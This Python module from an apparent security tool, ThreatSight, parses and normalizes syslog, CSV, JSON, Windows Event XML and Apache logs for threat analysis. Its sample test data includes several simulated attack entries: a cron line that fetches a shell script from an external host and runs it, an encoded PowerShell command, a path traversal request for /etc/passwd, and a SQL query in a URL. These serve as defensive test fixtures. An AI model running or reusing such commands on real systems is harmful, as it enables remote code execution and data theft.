"""
ThreatSight — Module 1: Log Ingest & Normalize
===============================================
Accepts logs in multiple formats and normalizes them into
ThreatSight's internal schema for downstream analysis.

Supported formats:
  - JSON  (native ThreatSight format)
  - CSV   (generic log export)
  - Syslog (RFC 3164 / RFC 5424)
  - Windows Event Log XML
  - Apache/Nginx access log

Author: Krutika Jagdale
"""

import csv, io, json, re, xml.etree.ElementTree as ET
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

REQUIRED_FIELDS = {"id", "timestamp", "source_ip", "user", "query", "context"}

def _now_utc():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def _safe_id(prefix, idx):
    return f"{prefix}{idx:04d}"

def _make_record(record_id, timestamp, source_ip, user, query, context, raw=None):
    return {
        "id": record_id,
        "timestamp": timestamp,
        "source_ip": source_ip or "0.0.0.0",
        "user": user or "unknown",
        "query": query or "",
        "context": context or "unknown",
        "_raw": raw or {},
    }

def parse_json(content):
    data = json.loads(content)
    if not isinstance(data, list):
        raise ValueError("JSON input must be an array of log records.")
    records = []
    for idx, item in enumerate(data, 1):
        for field in REQUIRED_FIELDS:
            item.setdefault(field, "unknown" if field != "id" else _safe_id("J", idx))
        records.append(_make_record(
            item.get("id", _safe_id("J", idx)),
            item.get("timestamp", _now_utc()),
            item.get("source_ip", "0.0.0.0"),
            item.get("user", "unknown"),
            item.get("query", ""),
            item.get("context", "unknown"),
            raw=item,
        ))
    return records

def parse_csv(content):
    ALIASES = {
        "source_ip": ["source_ip","src_ip","ip","source","client_ip","remote_addr"],
        "user":      ["user","username","user_id","account","principal"],
        "query":     ["query","message","event","log_message","command","request"],
        "context":   ["context","app","application","service","endpoint"],
        "timestamp": ["timestamp","time","datetime","date","@timestamp","event_time"],
        "id":        ["id","event_id","record_id","log_id"],
    }
    reader = csv.DictReader(io.StringIO(content))
    headers = reader.fieldnames or []
    def resolve(field):
        for a in ALIASES[field]:
            if a in headers:
                return a
        return None
    col = {f: resolve(f) for f in ALIASES}
    records = []
    for idx, row in enumerate(reader, 1):
        records.append(_make_record(
            row.get(col["id"] or "", _safe_id("C", idx)),
            row.get(col["timestamp"] or "", _now_utc()),
            row.get(col["source_ip"] or "", "0.0.0.0"),
            row.get(col["user"] or "", "unknown"),
            row.get(col["query"] or "", ""),
            row.get(col["context"] or "", "csv_import"),
            raw=dict(row),
        ))
    return records

def parse_syslog(content):
    SYSLOG_RE = re.compile(
        r"(?P<month>\w{3})\s+(?P<day>\d+)\s+(?P<time>\d{2}:\d{2}:\d{2})\s+"
        r"(?P<host>\S+)\s+(?P<proc>\S+?)(?:\[\d+\])?:\s+(?P<msg>.+)"
    )
    records = []
    year = datetime.now().year
    for idx, line in enumerate(content.splitlines(), 1):
        line = line.strip()
        if not line:
            continue
        m = SYSLOG_RE.match(line)
        if m:
            g = m.groupdict()
            ts = f"{year} {g['month']} {g['day']} {g['time']}"
            msg = g["msg"]
            ip_m = re.search(r"(?:from|src|source)\s+(\d{1,3}(?:\.\d{1,3}){3})", msg)
            usr_m = re.search(r"(?:for user|for)\s+(\S+)", msg)
            records.append(_make_record(
                _safe_id("S", idx), ts,
                ip_m.group(1) if ip_m else g.get("host","0.0.0.0"),
                usr_m.group(1) if usr_m else "unknown",
                msg, g.get("proc","syslog"), raw={"raw_line":line,**g},
            ))
        else:
            records.append(_make_record(
                _safe_id("S", idx), _now_utc(),
                "0.0.0.0","unknown",line,"syslog_raw",raw={"raw_line":line},
            ))
    return records

def parse_windows_event_xml(content):
    content = content.strip()
    if not content.startswith("<Events>"):
        content = f"<Events>{content}</Events>"
    root = ET.fromstring(content)
    NS = "http://schemas.microsoft.com/win/2004/08/events/event"
    ECTX = {
        "4624":"Successful Logon","4625":"Failed Logon","4648":"Explicit Credential Logon",
        "4688":"Process Creation","4698":"Scheduled Task Created","4720":"User Account Created",
        "4732":"Member Added to Security Group","1":"Sysmon Process Create",
        "3":"Sysmon Network Connection","7":"Sysmon Image Loaded",
    }
    records = []
    seen = set()
    for idx, ev in enumerate(root.iter(f"{{{NS}}}Event"), 1):
        eid = ts = chan = ""
        sys_el = ev.find(f"{{{NS}}}System")
        if sys_el is not None:
            eid_el = sys_el.find(f"{{{NS}}}EventID")
            eid = eid_el.text if eid_el is not None else ""
            tc = sys_el.find(f"{{{NS}}}TimeCreated")
            ts = tc.get("SystemTime", _now_utc()) if tc is not None else _now_utc()
            ch = sys_el.find(f"{{{NS}}}Channel")
            chan = ch.text if ch is not None else "Windows"
        ed = ev.find(f"{{{NS}}}EventData")
        fields = {}
        if ed is not None:
            for d in ed:
                fields[d.get("Name","Data")] = d.text or ""
        key = f"{eid}-{ts}-{fields.get('TargetUserName','')}"
        if key in seen:
            continue
        seen.add(key)
        user = fields.get("SubjectUserName") or fields.get("TargetUserName") or "unknown"
        ip   = fields.get("IpAddress","0.0.0.0").replace("-","0.0.0.0")
        qry  = fields.get("CommandLine") or fields.get("ProcessName") or fields.get("ObjectName") or f"EventID {eid}"
        ctx  = ECTX.get(str(eid), f"EventID {eid}/{chan}")
        records.append(_make_record(_safe_id("W",idx), ts, ip, user, qry, ctx, raw={"event_id":eid,**fields}))
    return records

def parse_apache_log(content):
    APACHE_RE = re.compile(
        r'(?P<ip>\S+)\s+\S+\s+(?P<user>\S+)\s+\[(?P<time>[^\]]+)\]\s+'
        r'"(?P<request>[^"]+)"\s+(?P<status>\d{3})\s+(?P<size>\S+)'
    )
    records = []
    for idx, line in enumerate(content.splitlines(), 1):
        line = line.strip()
        if not line:
            continue
        m = APACHE_RE.match(line)
        if m:
            g = m.groupdict()
            records.append(_make_record(
                _safe_id("A",idx), g["time"], g["ip"],
                g["user"] if g["user"] != "-" else "anonymous",
                g["request"], f"HTTP {g['status']}", raw=g,
            ))
        else:
            records.append(_make_record(_safe_id("A",idx),_now_utc(),"0.0.0.0","unknown",line,"apache_raw",raw={"raw_line":line}))
    return records

def detect_format(content, path=None):
    s = content.strip()
    if path:
        ext = Path(path).suffix.lower()
        if ext == ".json": return "json"
        if ext == ".csv":  return "csv"
        if ext in (".xml",".evtx"): return "windows_xml"
    if s.startswith("[") or s.startswith("{"):  return "json"
    if s.startswith("<"):                        return "windows_xml"
    if "EventID" in s or "TimeCreated" in s:    return "windows_xml"
    if re.match(r"(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d+|<\d+>", s): return "syslog"
    if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.+\"(GET|POST|PUT|DELETE|HEAD)", s): return "apache"
    first = s.splitlines()[0] if s.splitlines() else ""
    if "," in first and not first.startswith("<"): return "csv"
    return "syslog"

def ingest(source=None, content=None, fmt="auto"):
    if source is not None:
        path = Path(source)
        if not path.exists():
            raise FileNotFoundError(f"Log file not found: {path}")
        content = path.read_text(encoding="utf-8", errors="replace")
        path_str = str(path)
    else:
        path_str = None
    if not content:
        raise ValueError("No log content provided.")
    if fmt == "auto":
        fmt = detect_format(content, path_str)
    parsers = {
        "json": parse_json, "csv": parse_csv, "syslog": parse_syslog,
        "windows_xml": parse_windows_event_xml, "apache": parse_apache_log,
    }
    if fmt not in parsers:
        raise ValueError(f"Unknown format '{fmt}'. Choose from: {list(parsers)}")
    return parsers[fmt](content)

# ── Sample data for testing ──────────────────────────────────────────────────
def get_sample_syslog():
    return """Jan 15 08:23:11 webserver01 sshd[1234]: Failed password for root from 203.0.113.88 port 22 ssh2
Jan 15 08:23:14 webserver01 sshd[1234]: Failed password for admin from 203.0.113.88 port 22 ssh2
Jan 15 08:23:17 webserver01 sshd[1234]: Failed password for root from 203.0.113.88 port 22 ssh2
Jan 15 08:24:01 webserver01 sshd[1235]: Accepted password for svc_deploy from 192.168.1.10 port 54231 ssh2
Jan 15 08:25:33 webserver01 sudo[2001]: dev_user_02 : TTY=pts/1 ; PWD=/home/dev ; USER=root ; COMMAND=/bin/bash
Jan 15 08:26:44 webserver01 cron[3001]: (root) CMD (wget http://external-server.com/payload.sh -O /tmp/x && bash /tmp/x)"""

def get_sample_windows_xml():
    return """<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System><EventID>4625</EventID><TimeCreated SystemTime="2026-01-15T08:23:11.000Z"/><Channel>Security</Channel></System>
    <EventData>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="IpAddress">203.0.113.88</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System><EventID>4688</EventID><TimeCreated SystemTime="2026-01-15T08:25:33.000Z"/><Channel>Security</Channel></System>
    <EventData>
      <Data Name="SubjectUserName">dev_user_02</Data>
      <Data Name="CommandLine">powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0</Data>
      <Data Name="IpAddress">192.168.1.45</Data>
    </EventData>
  </Event>
</Events>"""

def get_sample_apache():
    return """203.0.113.88 - - [15/Jan/2026:08:23:11 -0700] "GET /admin/login.php HTTP/1.1" 200 1234
203.0.113.88 - - [15/Jan/2026:08:23:14 -0700] "POST /admin/login.php HTTP/1.1" 401 512
203.0.113.88 - - [15/Jan/2026:08:23:20 -0700] "GET /../../../etc/passwd HTTP/1.1" 403 256
192.168.1.10 - analyst_01 [15/Jan/2026:08:24:01 -0700] "GET /api/reports?q=SELECT+*+FROM+users HTTP/1.1" 200 4096"""
